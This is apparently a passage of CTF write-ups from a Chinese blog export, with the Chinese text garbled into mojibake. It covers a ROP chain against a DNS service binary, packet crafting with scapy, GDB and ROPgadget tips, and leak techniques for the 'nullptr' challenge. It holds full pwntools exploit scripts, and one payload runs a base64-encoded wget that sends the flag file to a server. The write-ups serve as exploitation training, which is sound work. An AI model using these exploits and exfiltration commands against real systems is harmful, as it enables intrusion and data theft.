æ–¹æ³•2ï¼šåˆ©ç”¨æ›´å·§å¦™çš„gadget\n\nä¸Šé¢çš„æ–¹æ³•éœ€è¦å¤šæ¬¡è·ŸæœåŠ¡å™¨äº¤äº’å‘é€æŠ¥æ–‡ï¼Œç”±äºå‘é€çš„æŠ¥æ–‡ä¼šå¯¼è‡´dnsæœåŠ¡é‡å¯ï¼Œä¸‹ä¸€æ¬¡å‘é€éœ€ç­‰å¾…è‡³å°‘15ç§’ï¼Œé€Ÿåº¦ææ…¢ã€‚è€ƒè™‘å­˜ä¸å­˜åœ¨ROPé“¾èƒ½å®ç°å‘é€ä¸€æ¬¡æŠ¥æ–‡å°±æˆåŠŸåˆ©ç”¨ã€‚\n\næ§åˆ¶æµåŠ«æŒæ—¶ï¼Œå¯„å­˜å™¨æƒ…å†µå¦‚ä¸‹ï¼š\n\n```bash\n$eax   : 0xffffffff\n$ebx   : 0xffffffff\n$ecx   : 0xffb3d140  â†’  \";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;.ls > /tmp/x\"\n$edx   : 0xffb3ce67  â†’  \"ls > /tmp/x #;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[...]\"\n$esp   : 0xffb3d1ec  â†’  0x11111111\n$ebp   : 0x2e656463 (\"cde.\"?)\n$esi   : 0x09fe69c0  â†’  0x00002910\n$edi   : 0xf7f58000  â†’  0x001ead6c\n$eip   : 0x0804f613  â†’   ret \n```\n\nç›®æ ‡gadget â€œcall popenâ€çš„å‚æ•°åˆ†åˆ«å­˜åœ¨eaxå’Œedxä¸­ï¼š\n\n```asm\n.text:08071802  \tpush    edx             ; modes\n.text:08071803  \tpush    eax             ; command\n.text:08071804   \tcall    _popen\n```\n\neaxæˆ‘ä»¬é€šè¿‡è¾“å…¥å°±èƒ½ç›´æ¥æ§åˆ¶ï¼Œedxä¸­å­˜ç€commandçš„åœ°å€ã€‚å¦‚æœå®ƒä»¬èƒ½æŠŠedxçš„å€¼ç»™eaxå°±å¥½äº†ã€‚\n\nå¯»æ‰¾è·Ÿedxä¸eaxç›¸å…³çš„æ“ä½œæŒ‡ä»¤ï¼Œå¦‚movï¼Œaddï¼Œsubï¼Œxchgç­‰ã€‚\n\n```bash\n$ ROPgadget --binary ./dns | grep add | grep edx | grep ret\n......\n0x0804b639 : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret\n0x0808787b : add eax, edx ; leave ; ret\t\t\t# leaveä¼šè¿ç§»æ ˆï¼Œä¸é€‚ç”¨æœ¬é¢˜æƒ…å†µ\n......\n```\n\näºæ˜¯å‘ç°äº†0x804b639è¿™æ¡gadgetã€‚\n\nè°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°ä¸¤ä¸ªé—®é¢˜ï¼š\n\n1. add eax,edxåï¼Œéœ€è¦ç»™eaxåŠ 1ã€‚äºæ˜¯é€šè¿‡`0x08056434`è¿™æ¡gadgeté…åˆç»™eaxçš„åˆå§‹å€¼æ¥è°ƒæ•´\n\n   ```bash\n   0x08056434 : add eax, 0x1b8 ; add cl, cl ; ret\n   0x0804c29a : adc al, 1 ; ret 0x458b  \t\t# ret 0x458bä¸å¯ç”¨ï¼Œespä¼šè½¬ç§»åˆ°æœªmapåœ°å€ç©ºé—´\n   ```\n\n   \n\n2. åœ¨æ‰§è¡Œpopenå‡½æ•°è¿‡ç¨‹ä¸­ï¼Œcommandç”±äºåœ¨ä½åœ°å€ï¼Œè¢«æ–°çš„æ•°æ®è¦†ç›–äº†ï¼Œå¯¼è‡´æ— æ³•æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚\n\n   äºæ˜¯éœ€è¦å°†commandæ”¾åœ¨æˆ‘ä»¬payloadçš„åé¢ï¼ˆæ ˆçš„é«˜åœ°å€ç©ºé—´æŒ‰ï¼‰ï¼Œå¹¶è°ƒæ•´ä¸€ä¸‹eaxçš„å€¼\n\næœ€ç»ˆåˆ©ç”¨è„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\nfrom scapy.all import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n# io = remote(\"59.63.224.108\",9999,typ=\"udp\")\n\neax_init = 0xf7f593d5         # hex(0xffffffff - 0x80a6fe0 + 0x3b6) = 0xf7f593d5\ng_adjust_eax = 0x0804b319      # 0x0804b319 : add eax, 0x80a6fe0 ; add ecx, ecx ; ret\ng_add_eax_edx = 0x0804b639      # add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret\ng_pop_edx = 0x0807ec72            # pop edx ; ret\nr_addr = 0x809c7b2              # &'r'\ng_popen_addr = 0x08071802       # push edx; push eax; call _popen\n\ndef construct_pkg(input_str):\n    # the data extracted from dns packet\n    start_dns = b\"\\x24\\xb4\\x01\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\"\n    end_dns = b\"\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x29\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0a\\x00\\x08\\xbe\\x1c\\x51\\x4d\\x75\\xab\\x0c\\x7f\"\n    patch = b\"\\x3f\"+b\"a\"*0x3f\n    shellcode1 = patch*13 + b\"\\x3f\" + b'a'*29 +p32(eax_init) + b'a'*30 + b\"\\x04\"+ b\"a\"*4\n    shellcode2 = b\"\\x2c\" + p32(g_add_eax_edx)+p32(0xffffffff)+p32(0xffffffff)+p32(0xffffffff)\\\n            +p32(0xffffffff)+p32(0xffffffff)+p32(0xffffffff)\\\n            +p32(g_adjust_eax)+p32(g_pop_edx)+p32(r_addr)+p32(g_popen_addr)\n    cmd_str = chr(len(input_str)+3).encode() + b\"a\"*3 + input_str\n    payload = start_dns + shellcode1 + shellcode2 + cmd_str + end_dns\n    # print(len(shellcode1))        # 0x385\n    # print(len(shellcode2))        # 0x2d\n    # print(hex(len(shellcode1)+len(shellcode2)))       # 0x3b2\n    return payload\n\n# echo wget 127.0.0.1/`cat /flag` | base64  #### d2dldCAxMjcuMC4wLjEvZmxhZ3t0ZXN0fQo=\ninput_str = b\"echo d2dldCAxMjcuMC4wLjEvZmxhZ3t0ZXN0fQo=|base64 -d|sh\"       # æ ¹æ®è‡ªå·±æœåŠ¡å™¨ipä¸åŒï¼Œéœ€è¦æ”¹base64çš„å†…å®¹\npayload = construct_pkg(input_str)\n\nio.send(payload)\nio.interactive()\n```\n\n\n\n# ç»­ï¼šwireshark+scapyå¤„ç†ç½‘ç»œæ•°æ®åŒ…\n\n## wiresharkæŠ“åŒ…\n\n[Ubuntu ä¸Š Wireshark çš„å®‰è£…ä¸ä½¿ç”¨](https://zhuanlan.zhihu.com/p/112649281)\n\nå®‰è£…wiresharkå¹¶æŠ“åŒ…\n\n```bash\nsudo apt show wireshark\t\t\t# æŸ¥çœ‹wiresharkçš„å¯ç”¨ç‰ˆæœ¬\nsudo apt install wireshark\t\t# å®‰è£…wireshark\nsudo wireshark\t\t\t\t\t# ä»¥rootç”¨æˆ·å¯åŠ¨wireshark\n```\n\ndigè®¿é—®æœ¬åœ°9999ç«¯å£è°ƒç”¨dnsè§£ææœåŠ¡ï¼Œç”¨wiresharkæŠ“åŒ…ã€‚å…ˆåè®¿é—®äº†ä¸¤æ¬¡ï¼Œå¾—åˆ°å¦‚ä¸‹æŠ¥æ–‡ï¼š[dns_catch.pcapng](dns_catch.pcapng)\n\n![image-20220628174139141](image-20220628174139141.png?size=600)\n\nDataæ®µæœªè‡ªåŠ¨è§£ææˆdnsæŠ¥æ–‡ï¼ˆå› ç«¯å£éé»˜è®¤çš„53ï¼‰ï¼Œå› æ­¤æŒ‰å¦‚ä¸‹æ­¥éª¤å°†dns udpå¯¹åº”çš„ç«¯å£è®¾ç½®æˆ9999\n\n![image-20220628174655395](image-20220628174655395.png?size=600)\n\né€‰ä¸­DNSï¼Œæ”¹UDP portsä¸º9999\n\n![image-20220628174745837](image-20220628174745837.png?size=600)\n\nè§£ææˆåŠŸï¼Œå¦‚ä¸‹ï¼š\n\n![image-20220628175000577](image-20220628175000577.png?size=600)\n\n\n\n## å®‰è£…scapy\n\n[Python Scapy æŠ¥æ–‡æ„é€ å’Œè§£æ](https://www.cnblogs.com/hiyong/p/14406739.html)\n\n[åœ°è¡¨æœ€å¼ºæ•°æ®åŒ…å·¥å…·--ScapyåŸºç¡€ç¯‡](https://bbs.huaweicloud.com/blogs/278399)\n\n[ç½‘ç»œå·¥å…·-Scapyä½¿ç”¨ä»‹ç»](https://mathpretty.com/12344.html)\n\n[ç›˜ç‚¹ä¸€æ¬¾Pythonå‘åŒ…æ”¶åŒ…åˆ©å™¨â€”â€”Scapy](https://developer.51cto.com/article/660332.html)\n\n[Pythonå­¦ä¹ ï¼šscapyåº“çš„Packetä¸strç›¸äº’è½¬æ¢](https://blog.csdn.net/KiteRunner/article/details/119521215)\n\n```bash\npip install scapy\n```\n\nåœ¨pythonä¸­å¼•å…¥scapyåº“\n\n```python\nfrom scapy.all import *\n\npacket = rdpcap(\"./dns_catch.pcapng\")\npacket.summary()\npacket[0].show()\nprint(packet[3][Ether].src)\nprint(packet[3][IP].src)\nprint(ls())\t\t\t\t\t# æ˜¾ç¤ºæ‰€æœ‰æ”¯æŒçš„æ•°æ®åŒ…å¯¹è±¡ã€‚å¦ï¼Œé€šè¿‡ls(ARP)æ¥æŸ¥çœ‹æŒ‡å®šåŒ…çš„å…·ä½“å†…å®¹\nprint(lsc())\t\t\t\t# åˆ—å‡ºæ‰€æœ‰å‡½æ•°\nshow_interfaces()\t\t\t# æ˜¾ç¤ºç½‘å¡ä¿¡æ¯\n```\n\nç”¨scapyäº¤äº’æ“ä½œç½‘ç»œæ•°æ®åŒ…ï¼Œè¯»å–pcapæ–‡ä»¶ä¸­Rawéƒ¨åˆ†ï¼Œå¹¶æŒ‰DNSæ ¼å¼è§£æ\n\n```python\nfrom pwn import *\nfrom scapy.all import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n\npacket = rdpcap(\"./dns_catch.pcapng\")\nbyte_data = packet[2][Raw].load\ndns_data = DNS(byte_data)\ndns_data.show()\t\t\t# å¯ä»¥æŸ¥çœ‹æ•°æ®æŒ‰ç…§DNSæ ¼å¼è§£æåçš„ç»“æœ\n\n# æ›¿æ¢åŸŸåå­—æ®µå‘èµ·æ”»å‡»\ndns_data.qd = DNSQR(qname=\"qqqqqq.aaaaa.sssss.com.ddddd.dddddd\",qtype=1,qclass=1)\n\nbyte_send = raw(dns_data)\t\t# å°†<class 'scapy.layers.dns.DNS'>è½¬æ¢æˆ<class 'bytes'>ç±»å‹\n\nio.sendline(byte_send)\nio.interactive()\n\n# æ„é€ ä¸€ä¸ªDNSè¯·æ±‚æŠ¥æ–‡\n# c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0)\n# c.qd = DNSQR(qname=www.baidu.com,qtype=1,qclass=1)\n\n```\n\n## æ„é€ æŠ¥æ–‡\n\nç”¨pwntoolså‘é€ä¸€ä¸ªåˆæ³•çš„åŒ…\n\n```python\nfrom pwn import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n\na = \"\\x24\\xb4\\x01\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x05\\x62\\x61\\x69\\x64\\x75\\x03\\x63\\x6f\\x6d\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x29\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0a\\x00\\x08\\xbe\\x1c\\x51\\x4d\\x75\\xab\\x0c\\x7f\"\n# è¿™æ®µæ•°æ®æ˜¯ç›´æ¥ä»wiresharkä¸­æ‘˜å‡ºæ¥çš„\nio.sendline(a)\nio.interactive()\n```\n\n# ç»­ï¼šx86ä¸‹æ‰¾å¯ç”¨çš„gadget\n\nä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ `--only` æŒ‡å®š\n\n```bash\nROPgadget --binary ./dns --only \"pop|ret\"\nROPgadget --binary ./dns --only \"mov|ret\"\nROPgadget --binary ./dns --only \"xchg|ret\"\nROPgadget --binary ./dns --only \"add|ret\"\nROPgadget --binary ./dns --only \"sub|ret\"\nROPgadget --binary ./dns --only \"inc|ret\"\nROPgadget --binary ./dns --only \"dec|ret\"\n# ç­‰ç­‰\n```\n\nå¦ä¸€ä¸ªç§æ–¹æ³•æ˜¯ç›´æ¥ `grep`\n\nä¾‹å¦‚ï¼Œæœ¬é¢˜ä¸­æ‰¾åˆ°å¸¦0x2eçš„nop+retæŒ‡ä»¤ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š\n\n```bash\n$ ROPgadget --binary ./dns | grep 2e | grep nop\n0x08052e0e : inc ebp ; nop ; jmp 0x8052ea8\n0x08052eb5 : nop ; add byte ptr [ebp + 0x4d], dh ; jmp 0x8052ec8\n0x08052eb2 : nop ; cmp dword ptr [ebp - 0x70], 0 ; jne 0x8052f0d ; jmp 0x8052ecb\n0x08052e0f : nop ; jmp 0x8052ea7\n0x0808cc29 : nop ; jmp 0x808cc2e\n0x0804a92e : nop ; ret\n```\n\n\n\n# ç»­ï¼šæ¯”å¯¹äºŒè¿›åˆ¶-bindiffçš„ä½¿ç”¨æ–¹æ³•\n\nå‡½æ•°çº§diffå·¥å…·ï¼š[bindiff](https://www.zynamics.com/software.html)\n\nç»“åˆIDAä¸€èµ·ä½¿ç”¨\n\n\n\n# ç»­ï¼šGDBè°ƒè¯•æ–¹æ³•æ±‡æ€»\n\n1ã€æ­£å¸¸ä½¿ç”¨gdbå¯åŠ¨ç¨‹åº\n\n```bash\ngdb ./xxx\n```\n\n2ã€æ­£å¸¸å¯åŠ¨ç¨‹åºï¼Œä½¿ç”¨gdb attach\n\n```bash\n# çª—å£1\n./xxx\n# çª—å£2\nps -ef | grep xxx\ngdb -p <xxx pid>\n```\n\n3ã€æ­£å¸¸å¯åŠ¨ç¨‹åºï¼Œä½¿ç”¨gdbserver attachï¼Œåä½¿ç”¨gdbè¿æ¥\n\n```bash\n# çª—å£1\n./xxx\n# çª—å£2\nps -ef | grep xxx\ngdbserver :1234 --attach <xxx pid>\n# çª—å£3\ngdb\n> target remote :1234\n```\n\n4ã€ã€å¤šè¿›ç¨‹ã€‘å¯åŠ¨ç¨‹åºæ—¶æŒ‡æ˜ä¸å¼€å¯å­è¿›ç¨‹\n\n```\n./dns -d -C ./dns.conf\n```\n\n5ã€è®¾ç½®gdbè°ƒè¯•å¤šè¿›ç¨‹/å¤šçº¿ç¨‹\n\n[GDB è°ƒè¯•å¤šè¿›ç¨‹æˆ–è€…å¤šçº¿ç¨‹åº”ç”¨](https://blog.csdn.net/gatieme/article/details/78309696)\n\n```bash\nset follow-fork-mode [parent|child]\t\t# è®¾ç½®è°ƒè¯•[çˆ¶è¿›ç¨‹/å­è¿›ç¨‹]\nset detach-on-fork [on|off]\t\t\t\t# æœªè°ƒè¯•è¿›ç¨‹[ç»§ç»­æ‰§è¡Œ/blockåœ¨forkä½ç½®]\nshow follow-fork-mode\nshow detach-on-fork\ninfo inferiors\t\t\t\t# æŸ¥çœ‹æ­£åœ¨è°ƒè¯•çš„è¿›ç¨‹ä¿¡æ¯\ninfo threads\t\t\t\t# æŸ¥è¯¢çº¿ç¨‹\nthread <thread number>\t\t# åˆ‡æ¢çº¿ç¨‹\n```\n\n[ä½¿ç”¨straceè·Ÿè¸ªå¤šè¿›ç¨‹ç¨‹åº](https://cloud.tencent.com/developer/article/1757470)\n\n```\nstrace -ff -o test.txt ./dns -C ./dns.conf\n```\n\n\n\n","tags":["dns","wireshark","scapy","bindiff","gdb"],"categories":["CTF"]},{"title":"alles ctf 2020ä¹‹nullptr","url":"/2022/02/20/alles-ctf-2020-nullptr/","content":"\n\n\né¢˜ç›®é™„ä»¶ï¼š[nullptr](nullptr.zip)\n\n# æ¼æ´åˆ†æ\n\n![](nullptr1.png)\n\n-\t64ä½x86-64å¯æ‰§è¡Œç¨‹åº\n-\tåŠ¨æ€é“¾æ¥ï¼Œæœªå»ç¬¦å·è¡¨\n-\tCanaryã€æ ˆä¸å¯æ‰§è¡Œå‡å¼€å¯\n-\tPIEå¼€å¯ï¼Œåœ°å€éšæœºåŒ–\n-\tPartial RELROï¼Œgotè¡¨å¯å†™\n\n![](nullptr2.png)\n\nè¿™ä¸ªé¢˜ç»™äº†æºç ï¼Œæ‰€ä»¥å°±ç›´æ¥åˆ†ææºç å§ã€‚Whileå¾ªç¯ä¸­çš„ä¸»è¦å¤„ç†é€»è¾‘æ˜¯ä¸¤ä¸ªcaseï¼š\n\nâ€‹\t1ã€view addressï¼šç”¨æˆ·è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œç¨‹åºä¼šå°†è¯¥åœ°å€åŠè¯¥å†…å­˜åœ°å€ä¸Šçš„å€¼æ‰“å°å‡ºæ¥ã€‚\n\nâ€‹\t2ã€nuke addressï¼šç”¨æˆ·è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œç¨‹åºä¼šå°†è¯¥åœ°å€ç½®ä¸ºNULLï¼Œä¹Ÿå°±æ˜¯è¯´å°†è¯¥åœ°å€çš„å…«ä¸ªå­—èŠ‚å…¨éƒ¨å˜ä¸º0ã€‚\n\né™¤æ­¤ä¹‹å¤–ï¼Œè¿™ä¸ªé¢˜è¿˜ç»™äº†ä¸€ä¸ªç°æˆçš„æ‰§è¡Œâ€œ/bin/shâ€çš„å‡½æ•°ï¼Œå› æ­¤åªè¦æˆ‘ä»¬èƒ½æ§åˆ¶eipåˆ°è¿™ä¸ªå‡½æ•°å°±èƒ½get shelläº†ã€‚\n\n**æ¼æ´ç‚¹**ï¼šæœªåˆå§‹åŒ–çš„å±€éƒ¨å˜é‡addrï¼Œä»¥åŠscanfï¼ˆ\"%lu\", &addrï¼‰ã€‚å½“ç”¨æˆ·è¾“å…¥ç»™scanfçš„å€¼éæ•°å­—æ—¶ï¼Œå†…éƒ¨è½¬åŒ–ä¼šå¤±è´¥ï¼Œ æ­¤æ—¶scanfå‡½æ•°ä¸­ä¼šfreeç”¨åˆ°çš„æŒ‡é’ˆï¼Œç„¶åè¿”å›ï¼Œè¿”å›çš„æ—¶å€™ä¸ä¼šæ›´æ”¹å…¶ä»–å‡½æ•°å‚æ•°çš„å€¼ï¼ˆæ­¤é¢˜ä¸ºaddrï¼‰ã€‚ç”±äºaddræ˜¯æ ˆä¸Šä¸€ä¸ªæœªåˆå§‹åŒ–çš„å€¼ï¼Œå› æ­¤18è¡Œæ‰“å°çš„æ—¶å€™ä¼šæ³„éœ²æ ˆä¸Šçš„ä¸€ä¸ªå€¼ã€‚\n\n\n\n# åˆ©ç”¨è¿‡ç¨‹\n\n## æ³„éœ²æ ˆåœ°å€ä¸å‡½æ•°åœ°å€\n\n![](nullptr3.png)\n\nview addressç»™éæ•°å­—æ—¶ï¼Œå°±ä¼šæ‰“å°æ ˆä¸Šçš„ä¿¡æ¯ã€‚å¯ä»¥çœ‹åˆ°addræ‰€å¤„çš„æ ˆä½ç½®æ­£å¥½å­˜æ”¾çš„æ˜¯å¦ä¸€ä¸ªæ ˆåœ°å€ï¼Œä¸”å…¶å€¼ä¸º1ã€‚åœ¨gdbä¸­è°ƒè¯•çš„æ—¶å€™è¿™ä¸ªæ ˆåœ°å€çš„å€¼æ˜¯ä¸ä¼šå˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªåœ°å€ä¸€å®šè·Ÿmainå‡½æ•°è¿è¡Œä¹‹å‰çš„å‡½æ•°ç›¸å…³ã€‚\n\nä¸€ä¸ªç¨‹åºåŠ è½½è¿è¡Œçš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š\n\n![](nullptr4.png)\n\nç»è¿‡è°ƒè¯•åˆ†æï¼Œé€šè¿‡view addræ³„éœ²å‡ºæ¥çš„æ ˆåœ°å€æ˜¯æ¯”mainå‡½æ•°æ ˆæ›´é«˜çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯__libc_start_mainæˆ–è€…_startçš„æ ˆå¸§ã€‚å› æ­¤ï¼Œé€šè¿‡è¿™ä¸ªæ ˆåœ°å€çš„åç§»å¯ä»¥æ‰¾åˆ°å­˜æ”¾è¿”å›åœ°å€ï¼ˆ_startï¼‰çš„æ ˆã€‚\n\n![](nullptr5.png)\n\næœ¬åœ°è°ƒè¯•å¯ä»¥è®¡ç®—å‡º`_start`å‡½æ•°åœ°å€å­˜æ”¾çš„ä½ç½®è·ç¦»ç¬¬ä¸€æ¬¡æ³„éœ²çš„æ ˆåœ°å€ï¼š\n\n0x7fffffffdec0 - 0x7fffffffde98 = 0x28 ï¼ˆdockerç¯å¢ƒä¸­è¿˜éœ€è¦ä»¥8å­—èŠ‚ä¸ºå•ä½è°ƒè¯•è·å–å®é™…å€¼ï¼‰\n\nå› æ­¤ï¼Œå†è°ƒç”¨view addrä¸€æ¬¡ï¼Œå°±å¯ä»¥æ³„éœ²å‡º`_start`å‡½æ•°åœ°å€ï¼Œæ ¹æ®è¯¥åœ°å€ä¸IDAé™æ€åˆ†æçš„_startå‡½æ•°åœ°å€å·®å€¼ï¼Œå°±è®¡ç®—å‡ºäº†ç¨‹åºçš„åŠ è½½åŸºå€ï¼Œé‚£ä¹ˆå°±ç»•è¿‡PIEäº†ã€‚\n\n![](nullptr6.png)\n\n## æ³„éœ²libc\n\næœ‰äº†ç¨‹åºåŠ è½½åŸºå€ï¼Œé€šè¿‡got.pltæ¡ç›®ï¼Œæ³„éœ²putså‡½æ•°çš„åœ°å€ï¼Œè¿›è€Œè·å¾—libcåŠ è½½åŸºå€ã€‚\n\n![](nullptr7.png)\n\nåˆ°è¿™ä¸€æ­¥çš„å‚è€ƒä»£ç ï¼š\n\n```python\n# pie_leak_libc.py\n# coding-utf-8\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./nullptr\")\nmylibc = ELF(\"./libc-2.30.so\")\nmyld = ELF(\"./ld-2.30.so\")\nmyproc = remote(\"127.0.0.1\",1024)\n#myproc = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef view(addr):\n    myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n    myproc.sendline('1')\n    myproc.recvuntil(\"view address> \")\n    myproc.sendline(addr)\n    myproc.recvline()\n    ret = myproc.recvline()\n    return ret\n\ndef setnull(addr):\n    myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n    myproc.sendline('2')\n    myproc.recvuntil(\"nuke address> \")\n    myproc.sendline(addr)\n\n###æ³„éœ²æ ˆåœ°å€\n#gdb.attach(myproc,'file ./nullptr \\n b* main')\nstack_addr = int(view('a').strip().split(\":\")[0],16)\n#log.warn(\"stack_addr is: 0x%x\" % stack_addr)\n\n###æ³„éœ²_startå‡½æ•°åœ°å€\noffset1 = stack_addr - (0x28 + 8*1)\n#offset1 = stack_addr - 0x28 \nstart_addr = int(view(str(offset1)).strip().split(\":\")[1],16)\n#log.warn(\"start_addr is: 0x%x\" % start_addr)\n\n###è®¡ç®—ç¨‹åºåŠ è½½åŸºå€\nelf_base = start_addr - myelf.symbols['_start']\nshell_addr = elf_base + myelf.symbols['get_me_out_of_this_mess']\nlog.warn(\"elf_base is: 0x%x\" % elf_base)\n#log.warn(\"shell_addr is: 0x%x\" % shell_addr)\n\n###æ³„éœ²libcåŠ è½½åŸºå€\nputs_got = elf_base + myelf.got[\"puts\"]\ngot_base = puts_got - 0x18\nputs_libc = int(view(str(puts_got)).strip().split(\":\")[1],16)\nlibc_base = puts_libc - mylibc.symbols[\"puts\"]\n#log.warn(\"puts_got is: 0x%x\" % puts_got)\nlog.warn(\"puts_libc is: 0x%x\" % puts_libc)\nlog.warn(\"libc_base is: 0x%x\" % libc_base)\nlog.warn(\"got_base is: 0x%x\" % got_base)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## èŠ±å¼è¦†å†™gotè¡¨\n\næ•´ç†ä¸€ä¸‹ç°åœ¨æœ‰çš„æ¡ä»¶ï¼š\n-\tç¨‹åºå’Œlibcçš„åŠ è½½åŸºå€\n-\tget shellå‡½æ•°çš„åœ°å€\n-\twhileå¾ªç¯ä¸­çš„case2ï¼Œä»»æ„åœ°å€å†™null\n\nstdinæ¶‰åŠçš„_IO_FILEç»“æ„ï¼š\n\n![](nullptr8.png)\n\nscanfå‡½æ•°å°†ç”¨æˆ·è¾“å…¥å…ˆå­˜æ”¾åœ¨`_IO_read_base`æŒ‡å‘çš„å †ç©ºé—´ä¸­ï¼Œæœ€åå°†è¾“å…¥æ›´æ–°åˆ°`_IO_buf_base`æŒ‡å‘çš„å †ç©ºé—´ã€‚å †ç©ºé—´å’ŒelfåŠ è½½ç©ºé—´ï¼ˆå†…å«gotè¡¨é¡¹ï¼‰æ˜¯ç›¸é‚»çš„ï¼Œå¦‚ä¸‹å›¾ï¼Œä¸”å­˜åœ¨ä¸¤è€…åœ°å€åªæœ‰å3ä¸ªå­—èŠ‚ä¸åŒçš„æƒ…å†µã€‚å› ä¸ºå¼€äº†PIEï¼Œå¦‚æœæŸæ¬¡`got.plt`çš„èµ·å§‹åœ°å€å3ä¸ªå­—èŠ‚æ˜¯å…¨é›¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŠŠ`_IO_buf_base`å¤„å­˜æ”¾çš„å †åœ°å€å…¶å3ä¸ªå­—èŠ‚å†™æˆ0ï¼Œä¸‹ä¸€æ¬¡è°ƒç”¨scanfæ—¶è¾“å…¥å°±ä¼šè¢«å†™åˆ°gotè¡¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä»»æ„æ”¹å†™gotè¡¨é¡¹ï¼ŒåŠ«æŒå‡½æ•°ã€‚\n\n![](nullptr9.png)\n\næµ‹è¯•æ˜¯å¦å­˜åœ¨å3ä¸ªå­—èŠ‚å…¨ä¸º0çš„got.elfé¡¹ï¼š\n\n```python\n# test_got_plt.py\n# coding-utf-8\nfrom pwn import *\n# context(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    myelf = ELF(\"./nullptr\")\n    mylibc = ELF(\"./libc-2.30.so\")\n    myld = ELF(\"./ld-2.30.so\")\n    myproc = remote(\"127.0.0.1\",1024)\n    \n    def view(addr):\n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline('1')\n        myproc.recvuntil(\"view address> \")\n        myproc.sendline(addr)\n        myproc.recvline()\n        ret = myproc.recvline()\n        return ret\n\n    def setnull(addr):\n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline('2')\n        myproc.recvuntil(\"nuke address> \")\n    \n  \n    stack_addr = int(view('a').strip().split(\":\")[0],16)\n    #log.warn(\"stack_addr is: 0x%x\" % stack_addr)\n\n    offset1 = stack_addr - (0x28 + 8*1)\n    start_addr = int(view(str(offset1)).strip().split(\":\")[1],16)\n    log.warn(\"start_addr is: 0x%x\" % start_addr)\n\n    elf_base = start_addr - myelf.symbols['_start']\n    shell_addr = elf_base + myelf.symbols['get_me_out_of_this_mess']\n    elf_got_base = elf_base + 0x4000\n    log.warn(\"elf_base is: 0x%x\" % elf_base)\n    log.warn(\"elf_got_base: 0x%x\" % elf_got_base)\n    log.warn(\"shell_addr is: 0x%x\" % shell_addr)\n\n    puts_got = elf_base + myelf.got[\"puts\"]\n    puts_libc = int(view(str(puts_got)).strip().split(\":\")[1],16)\n    libc_base = puts_libc - mylibc.symbols[\"puts\"]\n    log.warn(\"puts_got is: 0x%x\" % puts_got)\n    log.warn(\"puts_libc is: 0x%x\" % puts_libc)\n    log.warn(\"libc_base is: 0x%x\" % libc_base)\n\n    if elf_got_base &0xfff000 == 0:\n        log.warn(\"success!elf_got_base is: 0x%x\" % elf_got_base)\n        #gdb.attach(myproc)\n        myproc.interactive()\n```\n\n![](nullptr10.png)\n\nä¸Šå›¾å¯çŸ¥ï¼Œæ˜¯å­˜åœ¨gotè¡¨é¡¹èµ·å§‹åœ°å€åä¸‰ä¸ªå­—èŠ‚ä¸ºå…¨0çš„æƒ…å†µæ˜¯å­˜åœ¨çš„ã€‚åªä¸è¿‡æœ‰ä¸€å®šçš„æ¦‚ç‡ã€‚\n\næ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨case2ä¸­çš„ä»»æ„åœ°å€å†™0æ¥å†™_IO_buf_baseä¸­å­˜æ”¾çš„å †åœ°å€äº†ã€‚\n\n![](nullptr11.png)\n\n`_IO_buf_base`è·Ÿ`_IO_2_1_stdin`ä¹‹é—´çš„åç§»å¦‚ä¸Šå›¾ï¼Œä½†æ˜¯ä¸èƒ½æŠŠæ•´ä¸ªåœ°å€å†™æˆ0ï¼Œæ‰€ä»¥å®é™…å†™çš„æ—¶å€™å¾—å¾€å‰åç§»5ä¸ªå­—èŠ‚ã€‚\n\nå¦å¤–ï¼Œå†™gotè¡¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°æ—¶putsï¼Œåœ¨ç¬¬4é¡¹ã€‚ç”±äºæ˜¯ä»å¤´å¼€å§‹è¦†ç›–ï¼Œæ‰€ä»¥è¦å…ˆæ³„éœ²å‡ºå‰ä¸‰é¡¹ï¼Œç„¶åæ„é€ å¥½payloadè¿›è¡Œæ”»å‡»ã€‚\n\n## 